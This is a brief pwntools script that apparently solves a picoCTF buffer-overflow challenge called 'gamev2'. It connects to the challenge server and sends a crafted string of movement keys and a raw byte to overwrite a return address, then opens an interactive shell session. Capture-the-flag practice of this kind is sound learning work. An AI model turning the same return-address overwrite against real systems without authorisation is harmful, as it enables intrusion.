#!/usr/bin/python3
from pwn import *

context.terminal = ["xfce4-terminal", "--execute"]
args.LOCAL = True
args.DEBUG = True

#get a connection
#sock = process("./gamev2")
#gdb.attach(sock)
sock = remote("saturn.picoctf.net", 49852)

#overwrite ret
bof_payload = "w" * 4 #set the vertical component to 0 - that involves messy multiplication
#set horizontal to 0x32
bof_payload += "d" * 0x2f
#set tile to 0x5d
bof_payload += "l"
bof_payload += "\x79" #hex for 0x5d
#up vertical
bof_payload += "w"
sock.sendlineafter("End tile position", bof_payload)
sock.interactive()
